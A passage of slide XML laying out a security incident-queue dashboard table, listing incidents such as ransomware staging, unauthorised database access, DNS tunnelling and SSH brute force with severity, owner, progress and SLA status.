            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Incident Queue — All Open and Recent Incidents</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3291840"/>
            <a:ext cx="1202436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337560"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3337560"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TITLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="3337560"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="3337560"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CATEGORY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3337560"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="3337560"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ASSIGNED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="3337560"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PROGRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="3337560"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SLA STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3547872"/>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2608" y="3584448"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3584448"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware Staging Detected — WORKSTATION-042</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="3584448"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="3584448"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malware</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3584448"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Investigating</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="3584448"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>j.smith</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="3584448"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="3584448"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SLA BREACHED — escalated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Rectangle 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3803904"/>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840480"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-002</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3840480"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Unauthorised DB Access from External IP 198.51.100.42</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="3840480"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="3840480"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Unauth Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3840480"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Containment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="3840480"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.chen</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="3840480"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>60%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="3840480"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SLA BREACHED — escalated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Rectangle 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4059936"/>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92608" y="4096512"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-003</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4096512"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Tunnelling Detected — k8s-node-07 (C2 exfil)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="4096512"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Medium</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="4096512"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>C2 Communication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="4096512"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="4096512"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>m.torres</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="4096512"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>45%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="4096512"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Within SLA — 3h remain</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Rectangle 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4315968"/>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2608" y="4352544"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-004</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4352544"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brute Force SSH — prod-web-01 (203.0.113.15)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="4352544"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>High</a:t>
